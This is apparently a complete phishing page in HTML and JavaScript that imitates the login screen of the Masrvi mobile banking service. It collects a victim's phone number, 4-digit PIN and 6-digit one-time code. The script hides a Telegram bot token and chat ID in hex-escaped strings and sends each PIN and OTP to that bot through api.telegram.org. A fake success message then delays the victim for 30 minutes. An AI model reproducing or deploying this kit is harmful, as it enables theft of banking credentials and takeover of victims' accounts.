<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masrvi</title>
    <style>
        :root { --mg: #00cd9b; --nv: #000080; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: sans-serif; }
        body { background: #fff; margin: 0; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .app { width: 100%; max-width: 450px; display: flex; flex-direction: column; }
        .h { padding: 20px; font-weight: bold; cursor: pointer; color: #333; }
        .c { padding: 0 30px; flex: 1; display: flex; flex-direction: column; }
        .logo { text-align: center; margin: 20px 0; }
        .t { font-size: 26px; font-weight: bold; margin-bottom: 25px; text-align: center; }
        .ig { background: #f8f9fa; border-radius: 12px; padding: 15px; display: flex; align-items: center; direction: ltr; border: 1px solid #eee; }
        .px { font-weight: bold; border-right: 1px solid #ddd; padding-right: 15px; margin-right: 15px; }
        .mi { border: none; background: transparent; font-size: 20px; outline: none; width: 100%; letter-spacing: 2px; }
        .ds { display: flex; gap: 8px; justify-content: center; margin: 30px 0; direction: ltr; }
        .dt { width: 42px; height: 50px; border-radius: 10px; border: 2px solid #e0e0e0; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: bold; color: var(--mg); transition: 0.2s; }
        .dt.a { border-color: var(--mg); background: #f0fffb; }
        .kp { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; background: #fafafa; border-top: 1px solid #eee; margin-top: auto; }
        .k { height: 60px; background: #fff; border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 22px; font-weight: 600; box-shadow: 0 2px 4px rgba(0,0,0,0.05); cursor: pointer; }
        .btn { width: 100%; background: var(--mg); color: #fff; border: none; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        #success { display: none; text-align: center; padding: 40px 20px; }
    </style>
</head>
<body>
<div class="app">
    <div id="s1" class="c">
        <div class="h"> < Ø±Ø¬ÙˆØ¹</div>
        <div class="logo"><h1 style="color:var(--mg);margin:0;">Ù…ØµØ±ÙÙŠ</h1><div style="color:var(--nv);font-weight:bold;margin-top:-5px">Masrvi</div></div>
        <div class="t">Ø§Ù„Ø§ØªØµØ§Ù„</div>
        <div class="ig"><span class="px">222</span><input type="tel" id="pIn" class="mi" maxlength="11" placeholder=""></div>
        <button id="b1" class="btn" style="margin-top:auto" onclick="go(2)" disabled>ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§ØªØµØ§Ù„</button>
    </div>

    <div id="s2" class="c" style="display:none">
        <div class="h" onclick="go(1)"> < Ø±Ø¬ÙˆØ¹</div>
        <div class="t">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø²Ùƒ Ø§Ù„Ø³Ø±ÙŠ</div>
        <div class="ds"><div class="dt" id="pin1"></div><div class="dt" id="pin2"></div><div class="dt" id="pin3"></div><div class="dt" id="pin4"></div></div>
        <div id="ls" style="display:none;"><button class="btn" onclick="sendPin()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button></div>
        <div class="kp">
            <div class="k" onclick="addN('1')">1</div><div class="k" onclick="addN('2')">2</div><div class="k" onclick="addN('3')">3</div>
            <div class="k" onclick="addN('4')">4</div><div class="k" onclick="addN('5')">5</div><div class="k" onclick="addN('6')">6</div>
            <div class="k" onclick="addN('7')">7</div><div class="k" onclick="addN('8')">8</div><div class="k" onclick="addN('9')">9</div>
            <div class="k" style="visibility:hidden"></div><div class="k" onclick="addN('0')">0</div><div class="k" onclick="delN()">âŒ«</div>
        </div>
    </div>

    <div id="s3" class="c" style="display:none">
        <div class="h" onclick="go(2)"> < Ø±Ø¬ÙˆØ¹</div>
        <div class="t">Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯</div>
        <div class="ds"><div class="dt" id="otp1"></div><div class="dt" id="otp2"></div><div class="dt" id="otp3"></div><div class="dt" id="otp4"></div><div class="dt" id="otp5"></div><div class="dt" id="otp6"></div></div>
        <div id="os" style="display:none;"><button class="btn" onclick="sendOtp()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button></div>
        <div class="kp">
            <div class="k" onclick="addO('1')">1</div><div class="k" onclick="addO('2')">2</div><div class="k" onclick="addO('3')">3</div>
            <div class="k" onclick="addO('4')">4</div><div class="k" onclick="addO('5')">5</div><div class="k" onclick="addO('6')">6</div>
            <div class="k" onclick="addO('7')">7</div><div class="k" onclick="addO('8')">8</div><div class="k" onclick="addO('9')">9</div>
            <div class="k" style="visibility:hidden"></div><div class="k" onclick="addO('0')">0</div><div class="k" onclick="delO()">âŒ«</div>
        </div>
    </div>

    <div id="success" class="c">
        <div style="font-size:60px;color:var(--mg);text-align:center">âœ“</div>
        <h2 style="color:var(--mg);text-align:center">ØªÙ…Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­</h2>
        <p style="font-size:18px; color:#555; line-height:1.6;text-align:center">ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø¨Ù†Ø¬Ø§Ø­. ÙŠØ±Ø¬Ù‰ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ Ø¨Ø¹Ø¯ <b>30 Ø¯Ù‚ÙŠÙ‚Ø©</b>.</p>
    </div>
</div>

<script>
    //  Ù…Ø§Ø±Ùˆ Ø§Ù„Ø­ÙˆØª  (  Ù„Ù…Ø´ÙŠØ·  )
    const _0x4f2a = ["\x38\x35\x31\x32\x33\x30\x38\x37\x37\x38\x3a\x41\x41\x47\x53\x41\x44\x32\x73\x66\x30\x73\x43\x67\x4e\x63\x34\x44\x47\x6c\x34\x30\x52\x2d\x6c\x6e\x61\x59\x39\x32\x42\x36\x56\x48\x52\x73", "\x36\x31\x36\x36\x35\x39\x37\x35\x30\x37"];
    
    let phone = "", pin = "", otp = "";

    function _getD(idx) { return _0x4f2a[idx]; }

    document.getElementById('pIn').addEventListener('input', function(e){
        let v = e.target.value.replace(/\D/g,'');
        let f = ""; for(let i=0; i<v.length; i++){ if(i>0 && i%2==0) f+=" "; f+=v[i]; }
        e.target.value = f; phone = v;
        document.getElementById('b1').disabled = (v.length !== 8);
    });

    function go(s) {
        document.getElementById('s1').style.display = (s==1)?'flex':'none';
        document.getElementById('s2').style.display = (s==2)?'flex':'none';
        document.getElementById('s3').style.display = (s==3)?'flex':'none';
        document.getElementById('success').style.display = (s==4)?'block':'none';
    }

    function addN(n) { if(pin.length < 4) { pin += n; updatePin(); } document.getElementById('ls').style.display = (pin.length === 4) ? 'block' : 'none'; }
    function delN() { pin = pin.slice(0, -1); updatePin(); document.getElementById('ls').style.display = 'none'; }
    function updatePin() { for(let i=1; i<=4; i++) { let b = document.getElementById('pin'+i); b.innerText = pin[i-1] || ""; b.className = pin[i-1] ? "dt a" : "dt"; } }

    function addO(n) { if(otp.length < 6) { otp += n; updateOtp(); } document.getElementById('os').style.display = (otp.length === 6) ? 'block' : 'none'; }
    function delO() { otp = otp.slice(0, -1); updateOtp(); document.getElementById('os').style.display = 'none'; }
    function updateOtp() { for(let i=1; i<=6; i++) { let b = document.getElementById('otp'+i); b.innerText = otp[i-1] || ""; b.className = otp[i-1] ? "dt a" : "dt"; } }

    function sendMsg(m) { 
        fetch(`https://api.telegram.org/bot${_getD(0)}/sendMessage?chat_id=${_getD(1)}&text=${encodeURIComponent(m)}`); 
    }

    function sendPin() { sendMsg(`ğŸ”” Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯\nğŸ“± Ù‡Ø§ØªÙ: 222${phone}\nğŸ”‘ Ø±Ù…Ø²: ${pin}`); go(3); }
    function sendOtp() { sendMsg(`ğŸ“© Ø±Ù…Ø² OTP\nğŸ“± Ù‡Ø§ØªÙ: 222${phone}\nğŸ”¢ Ø§Ù„Ø±Ù…Ø²: ${otp}`); go(4); }
</script>
</body>
</html>
